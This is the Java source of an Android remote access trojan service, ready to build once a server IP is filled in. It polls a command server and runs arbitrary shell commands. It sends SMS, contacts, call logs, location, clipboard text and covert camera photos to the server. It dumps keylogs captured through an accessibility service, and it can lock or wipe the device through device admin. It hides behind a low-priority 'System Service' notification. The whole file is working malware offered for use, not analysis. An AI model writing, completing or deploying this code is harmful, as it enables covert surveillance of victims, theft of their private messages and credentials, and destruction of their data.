package io.github.ratclient;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.graphics.*;
import android.hardware.camera2.*;
import android.location.*;
import android.media.Image;
import android.media.ImageReader;
import android.net.*;
import android.os.*;
import android.provider.*;
import android.util.*;
import android.view.*;
import android.widget.Toast;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;

import org.json.*;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.*;

public class RatService extends Service {

    // ─── CONFIG ───────────────────────────────────────────────
    // CHANGE THIS to your server IP before building
    private static final String C2_HOST = "YOUR_SERVER_IP";
    private static final int    C2_PORT = 8080;
    private static final String BASE_URL = "http://" + C2_HOST + ":" + C2_PORT;
    // ──────────────────────────────────────────────────────────

    private static final String TAG = "RatService";
    private static final int    NOTIF_ID   = 1337;
    private static final String CHANNEL_ID = "rat_fg";

    private String deviceId;
    private Handler mainHandler;
    private volatile boolean running = true;

    // ─── Service lifecycle ────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        mainHandler = new Handler(Looper.getMainLooper());
        deviceId = getOrCreateDeviceId();
        startForegroundNotif();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::registerLoop).start();
        new Thread(this::heartbeatLoop).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        super.onDestroy();
    }

    // ─── Registration ─────────────────────────────────────────

    private void registerLoop() {
        while (running) {
            try {
                JSONObject body = new JSONObject();
                body.put("device_id", deviceId);
                body.put("model",        Build.MODEL);
                body.put("manufacturer", Build.MANUFACTURER);
                body.put("android",      Build.VERSION.RELEASE);
                postJson(BASE_URL + "/register", body);
                break; // success
            } catch (Exception e) {
                sleep(5000);
            }
        }
    }

    // ─── Heartbeat + command polling ──────────────────────────

    private void heartbeatLoop() {
        while (running) {
            try {
                JSONObject body = new JSONObject();
                body.put("device_id", deviceId);
                String resp = postJson(BASE_URL + "/heartbeat", body);
                if (resp != null) {
                    JSONObject json = new JSONObject(resp);
                    JSONArray cmds = json.optJSONArray("commands");
                    if (cmds != null) {
                        for (int i = 0; i < cmds.length(); i++) {
                            final JSONObject cmd = cmds.getJSONObject(i);
                            new Thread(() -> executeCommand(cmd)).start();
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "heartbeat: " + e.getMessage());
            }
            sleep(3000);
        }
    }

    // ─── Command dispatcher ───────────────────────────────────

    private void executeCommand(JSONObject cmd) {
        try {
            String id   = cmd.getString("id");
            String type = cmd.getString("type");
            String args = cmd.optString("args", "");

            Object result = null;
            switch (type) {
                case "shell":         result = execShell(args);       break;
                case "device_info":   result = getDeviceInfo();       break;
                case "sms_list":      result = getSms();              break;
                case "contacts":      result = getContacts();         break;
                case "call_logs":     result = getCallLogs();         break;
                case "installed_apps":result = getInstalledApps();    break;
                case "location":      result = getLocation();         break;
                case "clipboard":     result = getClipboard();        break;
                case "camera":        takePhoto(id, args); return;
                case "toast":
                    mainHandler.post(() ->
                        Toast.makeText(this, args, Toast.LENGTH_LONG).show());
                    result = "toast shown";
                    break;

                // ── Accessibility commands ──────────────────────────────
                case "accessibility_status":
                    result = RatAccessibilityService.isEnabled()
                        ? "ENABLED — keylog active"
                        : "DISABLED — user must enable in Settings → Accessibility";
                    break;

                case "keylog":
                    result = RatAccessibilityService.dumpLog();
                    break;

                case "keylog_clear":
                    RatAccessibilityService.clearLog();
                    result = "keylog cleared";
                    break;

                case "current_app":
                    result = RatAccessibilityService.getCurrentApp();
                    break;

                case "last_notif":
                    result = RatAccessibilityService.getLastNotification();
                    break;

                // ── Device Admin commands ───────────────────────────────
                case "admin_status":
                    result = isDeviceAdminActive()
                        ? "ACTIVE — lock/wipe available"
                        : "INACTIVE — user must activate in Settings → Security → Device Admin";
                    break;

                case "lock_screen":
                    result = lockScreen();
                    break;

                case "wipe_device":
                    // args = "confirm" required to prevent accidental wipe
                    if ("confirm".equals(args)) {
                        result = wipeDevice();
                    } else {
                        result = "send args=confirm to confirm wipe";
                    }
                    break;

                case "disable_camera":
                    result = setCameraDisabled(true);
                    break;

                case "enable_camera":
                    result = setCameraDisabled(false);
                    break;

                case "open_accessibility":
                    // Open Accessibility Settings on the device screen
                    mainHandler.post(() -> {
                        Intent i = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                    });
                    result = "opened Accessibility Settings on device";
                    break;

                default:
                    result = "unknown command: " + type;
            }

            sendResult(id, type, result);

        } catch (Exception e) {
            Log.e(TAG, "exec: " + e.getMessage());
        }
    }

    // ─── Shell exec ───────────────────────────────────────────

    private String execShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            return sb.toString().trim();
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    // ─── Device info ──────────────────────────────────────────

    private JSONObject getDeviceInfo() throws JSONException {
        JSONObject j = new JSONObject();
        j.put("model",        Build.MODEL);
        j.put("manufacturer", Build.MANUFACTURER);
        j.put("android",      Build.VERSION.RELEASE);
        j.put("sdk",          Build.VERSION.SDK_INT);
        j.put("brand",        Build.BRAND);
        j.put("device",       Build.DEVICE);
        j.put("product",      Build.PRODUCT);
        j.put("device_id",    deviceId);
        return j;
    }

    // ─── SMS ──────────────────────────────────────────────────

    private JSONArray getSms() {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                int max = Math.min(c.getCount(), 50);
                for (int i = 0; i < max && c.moveToNext(); i++) {
                    JSONObject obj = new JSONObject();
                    obj.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                    obj.put("body",    c.getString(c.getColumnIndexOrThrow("body")));
                    obj.put("date",    c.getLong(c.getColumnIndexOrThrow("date")));
                    arr.put(obj);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "sms: " + e.getMessage());
        }
        return arr;
    }

    // ─── Contacts ─────────────────────────────────────────────

    private JSONArray getContacts() {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            if (c != null) {
                int max = Math.min(c.getCount(), 100);
                for (int i = 0; i < max && c.moveToNext(); i++) {
                    JSONObject obj = new JSONObject();
                    obj.put("name",   c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    obj.put("number", c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    arr.put(obj);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "contacts: " + e.getMessage());
        }
        return arr;
    }

    // ─── Call logs ────────────────────────────────────────────

    private JSONArray getCallLogs() {
        JSONArray arr = new JSONArray();
        try {
            Cursor c = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC");
            if (c != null) {
                int max = Math.min(c.getCount(), 50);
                for (int i = 0; i < max && c.moveToNext(); i++) {
                    JSONObject obj = new JSONObject();
                    obj.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    obj.put("type",   c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    obj.put("date",   c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    obj.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    arr.put(obj);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "calls: " + e.getMessage());
        }
        return arr;
    }

    // ─── Installed apps ───────────────────────────────────────

    private JSONArray getInstalledApps() throws Exception {
        JSONArray arr = new JSONArray();
        List<android.content.pm.ApplicationInfo> apps =
            getPackageManager().getInstalledApplications(0);
        for (android.content.pm.ApplicationInfo ai : apps) {
            JSONObject obj = new JSONObject();
            obj.put("package", ai.packageName);
            obj.put("name", getPackageManager().getApplicationLabel(ai).toString());
            arr.put(obj);
        }
        return arr;
    }

    // ─── Location ─────────────────────────────────────────────

    private JSONObject getLocation() throws JSONException {
        JSONObject j = new JSONObject();
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                j.put("lat", loc.getLatitude());
                j.put("lng", loc.getLongitude());
                j.put("accuracy", loc.getAccuracy());
                j.put("provider", loc.getProvider());
            } else {
                j.put("error", "location unavailable");
            }
        } catch (SecurityException e) {
            j.put("error", "permission denied");
        }
        return j;
    }

    // ─── Clipboard ────────────────────────────────────────────

    private String getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
                return item.getText() != null ? item.getText().toString() : "empty";
            }
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
        return "empty";
    }

    // ─── Camera ───────────────────────────────────────────────

    private void takePhoto(String cmdId, String facing) {
        // Camera2 API snapshot
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = null;
            int targetFacing = "front".equals(facing)
                ? CameraCharacteristics.LENS_FACING_FRONT
                : CameraCharacteristics.LENS_FACING_BACK;

            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                if (ch.get(CameraCharacteristics.LENS_FACING) == targetFacing) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) {
                sendResult(cmdId, "camera", "no camera found");
                return;
            }

            ImageReader reader = ImageReader.newInstance(640, 480,
                android.graphics.ImageFormat.JPEG, 1);
            String finalCameraId = cameraId;

            reader.setOnImageAvailableListener(r -> {
                try (Image img = r.acquireLatestImage()) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    sendResult(cmdId, "camera", b64);
                } catch (Exception e) {
                    sendResult(cmdId, "camera", "capture error: " + e.getMessage());
                }
            }, mainHandler);

            cm.openCamera(finalCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    try {
                        List<Surface> surfaces = Collections.singletonList(reader.getSurface());
                        CaptureRequest.Builder builder = device.createCaptureRequest(
                            CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());

                        device.createCaptureSession(surfaces,
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(builder.build(), null, mainHandler);
                                    } catch (Exception e) {
                                        sendResult(cmdId, "camera", "capture failed");
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession s) {
                                    sendResult(cmdId, "camera", "config failed");
                                }
                            }, mainHandler);
                    } catch (Exception e) {
                        sendResult(cmdId, "camera", "open error: " + e.getMessage());
                    }
                }
                @Override public void onDisconnected(CameraDevice d) { d.close(); }
                @Override public void onError(CameraDevice d, int e) {
                    d.close();
                    sendResult(cmdId, "camera", "camera error: " + e);
                }
            }, mainHandler);

        } catch (Exception e) {
            sendResult(cmdId, "camera", "exception: " + e.getMessage());
        }
    }

    // ─── Networking helpers ───────────────────────────────────

    private void sendResult(String cmdId, String type, Object result) {
        try {
            JSONObject body = new JSONObject();
            body.put("device_id", deviceId);
            body.put("cmd_id",    cmdId);
            body.put("type",      type);
            if (result instanceof JSONObject)       body.put("result", (JSONObject) result);
            else if (result instanceof JSONArray)   body.put("result", (JSONArray) result);
            else                                    body.put("result", String.valueOf(result));
            postJson(BASE_URL + "/result", body);
        } catch (Exception e) {
            Log.e(TAG, "sendResult: " + e.getMessage());
        }
    }

    private String postJson(String url, JSONObject body) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        byte[] data = body.toString().getBytes("UTF-8");
        conn.getOutputStream().write(data);
        InputStream is = conn.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        return sb.toString();
    }

    // ─── Misc ─────────────────────────────────────────────────

    // ─── Device Admin helpers ────────────────────────────────────────

    private DevicePolicyManager getDpm() {
        return (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
    }

    private ComponentName getAdminComponent() {
        return new ComponentName(this, RatDeviceAdmin.class);
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = getDpm();
        return dpm != null && dpm.isAdminActive(getAdminComponent());
    }

    private String lockScreen() {
        if (!isDeviceAdminActive()) return "error: device admin not active";
        try {
            getDpm().lockNow();
            return "screen locked";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    private String wipeDevice() {
        if (!isDeviceAdminActive()) return "error: device admin not active";
        try {
            getDpm().wipeData(0); // 0 = wipe internal storage only
            return "wipe initiated";
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    private String setCameraDisabled(boolean disable) {
        if (!isDeviceAdminActive()) return "error: device admin not active";
        try {
            getDpm().setCameraDisabled(getAdminComponent(), disable);
            return "camera " + (disable ? "disabled" : "enabled");
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    private String getOrCreateDeviceId() {
        SharedPreferences prefs = getSharedPreferences("rat", MODE_PRIVATE);
        String id = prefs.getString("device_id", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }

    private void startForegroundNotif() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
        Notification notif = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build();
        startForeground(NOTIF_ID, notif);
    }

    private void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
    }
}
